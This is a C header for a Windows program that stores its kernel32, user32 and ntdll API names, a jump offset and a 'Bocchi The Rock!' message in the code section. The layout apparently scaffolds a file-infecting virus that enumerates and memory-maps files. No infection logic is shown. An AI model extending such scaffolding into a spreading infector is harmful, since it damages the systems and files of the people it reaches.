#pragma once
#include <Windows.h>

__attribute__((section(".text"))) int jmpOffset = 0x13;

__attribute__((section(".text"))) wchar_t aKernel32Dll[] = L"Kernel32.dll";
__attribute__((section(".text"))) char aUser32Dll[] = "User32.dll";
__attribute__((section(".text"))) char aNtDll[] = "NtDll.dll";

__attribute__((section(".text"))) char aCloseHandle[] = "CloseHandle";
__attribute__((section(".text"))) char aCreateFileA[] = "CreateFileA";
__attribute__((section(".text"))) char aGetFileSize[] = "GetFileSize";
__attribute__((section(".text"))) char aGetProcAddress[] = "GetProcAddress";
// __attribute__((section(".text"))) char aGetProcessHeap[] = "GetProcessHeap";
// __attribute__((section(".text"))) char aHeapAlloc[] = "HeapAlloc";
// __attribute__((section(".text"))) char aHeapFree[] = "HeapFree";
__attribute__((section(".text"))) char aLoadLibraryA[] = "LoadLibraryA";
__attribute__((section(".text"))) char aMessageBoxA[] = "MessageBoxA";
// __attribute__((section(".text"))) char aReadFile[] = "ReadFile";
// __attribute__((section(".text"))) char aWriteFile[] = "WriteFile";
__attribute__((section(".text"))) char aCreateFileMappingA[] = "CreateFileMappingA";
__attribute__((section(".text"))) char aMapViewOfFile[] = "MapViewOfFile";
__attribute__((section(".text"))) char aUnmapViewOfFile[] = "UnmapViewOfFile";
// __attribute__((section(".text"))) char aGetModuleHandleA[] = "GetModuleHandleA";
// __attribute__((section(".text"))) char aCopyFileA[] = "CopyFileA";
__attribute__((section(".text"))) char aRtlCopyMemory[] = "RtlCopyMemory";
__attribute__((section(".text"))) char aGetModuleFileNameA[] = "GetModuleFileNameA";
__attribute__((section(".text"))) char aFindFirstFileA[] = "FindFirstFileA";
__attribute__((section(".text"))) char aFindNextFileA[] = "FindNextFileA";
__attribute__((section(".text"))) char aFindClose[] = "FindClose";

// __attribute__((section(".text"))) char a[] = "";
// __attribute__((section(".text"))) char a[] = "";
// __attribute__((section(".text"))) char a[] = "";
// __attribute__((section(".text"))) char a[] = "";
// __attribute__((section(".text"))) char a[] = "";

__attribute__((section(".text"))) char aBocchiTheRock[] = "Bocchi The Rock!";
__attribute__((section(".text"))) char aHehehe[] = "Hehehe";
